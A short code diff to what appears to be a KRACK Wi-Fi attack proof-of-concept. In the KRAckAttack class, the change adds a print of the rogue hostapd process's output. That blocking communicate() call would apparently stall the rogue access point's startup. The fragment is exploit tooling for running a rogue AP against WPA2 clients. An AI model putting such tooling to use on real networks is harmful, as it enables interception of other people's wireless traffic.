@@ -932,6 +932,7 @@ class KRAckAttack():
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 
 		self.hostapd = subprocess.Popen(["hostapd", "/root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		print (self.hostapd.communicate()[0])
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
